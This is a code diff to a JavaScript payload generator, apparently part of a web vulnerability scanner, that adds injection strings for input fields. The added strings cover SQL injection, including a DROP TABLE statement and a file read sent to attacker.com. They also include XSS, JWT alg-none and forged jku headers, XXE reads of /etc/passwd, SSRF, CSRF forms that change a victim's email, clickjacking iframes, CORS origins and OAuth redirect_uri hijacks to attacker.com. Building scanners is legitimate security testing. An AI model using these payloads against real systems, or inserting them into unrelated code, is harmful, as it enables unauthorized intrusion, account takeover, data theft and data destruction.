@@ -188,6 +188,12 @@ function generatePayloads(field) {
         payloads.push(...category);
       });
     });
+
+    // Additional SQL Injection payloads
+    payloads.push("' AND 1=1--");
+    payloads.push("' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--");
+    payloads.push("'; DROP TABLE users--");
+    payloads.push("' UNION SELECT LOAD_FILE('\\\\attacker.com\\share\\file.txt')--");
   }
 
   // ===== Cross-Site Scripting (XSS) Attacks =====
@@ -209,6 +215,83 @@ function generatePayloads(field) {
     // DOM-based XSS
     payloads.push("#<script>alert(1)</script>");
     payloads.push("?param=<script>alert(1)</script>");
+
+    // Additional XSS payloads
+    payloads.push("<svg><script>alert(1)</script></svg>");
+    payloads.push("data:text/html,<script>alert(1)</script>");
+    payloads.push("javascript:alert(1)");
+  }
+
+  // ===== JWT Attacks =====
+  if (fieldName.includes('token') || fieldName.includes('jwt') || fieldName.includes('auth')) {
+    payloads.push('{"alg":"none"}');
+    payloads.push('{"alg":"HS256","kid":"../../../dev/null"}');
+    payloads.push('{"alg":"RS256","jwk":{"kty":"RSA","e":"AQAB","n":"..."}}');
+    payloads.push('{"alg":"RS256","jku":"https://attacker.com/jwks.json"}');
+  }
+
+  // ===== XXE Attacks =====
+  if (fieldType === 'text' || fieldType === 'textarea') {
+    payloads.push('<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]><foo>&xxe;</foo>');
+    payloads.push('<foo xmlns:xi="http://www.w3.org/2001/XInclude"><xi:include parse="text" href="file:///etc/passwd"/></foo>');
+    payloads.push('<!DOCTYPE foo [ <!ENTITY % xxe SYSTEM "file:///etc/passwd"> %xxe; ]>');
+  }
+
+  // ===== SSRF Attacks =====
+  if (fieldName.includes('url') || fieldName.includes('endpoint') || fieldName.includes('api')) {
+    payloads.push('http://localhost/admin');
+    payloads.push('http://192.168.0.1/admin');
+    payloads.push('file:///etc/passwd');
+    payloads.push('http://attacker.com:80/');
+  }
+
+  // ===== CSRF Attacks =====
+  if (fieldType === 'text' || fieldType === 'textarea' || fieldType === 'hidden') {
+    payloads.push('<form action="https://vulnerable.com/change-email" method="POST">' +
+                 '<input type="hidden" name="email" value="attacker@evil.com">' +
+                 '</form><script>document.forms[0].submit()</script>');
+    payloads.push('<img src="https://vulnerable.com/change-email?email=attacker@evil.com">');
+    payloads.push('<script>fetch("https://vulnerable.com/change-email", {' +
+                 'method: "POST",' +
+                 'body: "email=attacker@evil.com",' +
+                 'credentials: "include"' +
+                 '})</script>');
+  }
+
+  // ===== Clickjacking Attacks =====
+  if (fieldName.includes('frame') || fieldName.includes('iframe') || fieldName.includes('embed')) {
+    payloads.push('<iframe src="https://vulnerable.com" style="opacity:0;position:absolute;top:0;left:0;width:100%;height:100%;"></iframe>');
+    payloads.push('<div style="position:relative;width:500px;height:500px;">' +
+                 '<iframe src="https://vulnerable.com" style="position:absolute;top:0;left:0;width:100%;height:100%;"></iframe>' +
+                 '<button style="position:absolute;top:50%;left:50%;transform:translate(-50%,-50%);">Click me!</button>' +
+                 '</div>');
+  }
+
+  // ===== DOM-based Vulnerabilities =====
+  if (fieldType === 'text' || fieldType === 'textarea' || fieldType === 'search') {
+    payloads.push('javascript:alert(document.domain)');
+    payloads.push('"><img src=x onerror=alert(document.domain)>');
+    payloads.push('"><svg onload=alert(document.domain)>');
+    payloads.push('"><script>alert(document.domain)</script>');
+    payloads.push('"><iframe src=javascript:alert(document.domain)>');
+  }
+
+  // ===== CORS Attacks =====
+  if (fieldName.includes('origin') || fieldName.includes('header') || fieldName.includes('cors')) {
+    payloads.push('https://attacker.com');
+    payloads.push('null');
+    payloads.push('attacker.com');
+    payloads.push('https://attacker.com:443');
+    payloads.push('https://attacker.com:80');
+  }
+
+  // ===== OAuth Attacks =====
+  if (fieldName.includes('oauth') || fieldName.includes('token') || fieldName.includes('auth')) {
+    payloads.push('https://oauth-provider.com/authorize?client_id=client&redirect_uri=https://attacker.com/callback&response_type=token');
+    payloads.push('https://oauth-provider.com/authorize?client_id=client&redirect_uri=https://attacker.com/callback&response_type=code');
+    payloads.push('https://oauth-provider.com/authorize?client_id=client&redirect_uri=https://attacker.com/callback&response_type=id_token');
+    payloads.push('https://oauth-provider.com/authorize?client_id=client&redirect_uri=https://attacker.com/callback&response_type=token%20id_token');
+    payloads.push('https://oauth-provider.com/authorize?client_id=client&redirect_uri=https://attacker.com/callback&response_type=code%20id_token');
   }
 
   // ===== Path Traversal Attacks =====
